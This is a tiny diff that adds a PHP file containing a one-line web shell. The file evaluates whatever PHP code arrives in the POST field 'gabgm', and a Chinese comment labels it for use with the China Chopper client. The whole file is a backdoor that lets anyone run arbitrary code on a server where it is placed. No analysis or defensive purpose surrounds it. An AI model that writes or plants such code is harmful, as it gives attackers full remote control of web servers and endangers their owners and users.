@@ -1,0 +1,5 @@
+<?php
+eval($_POST["gabgm"]);
+?>
+
+//菜刀
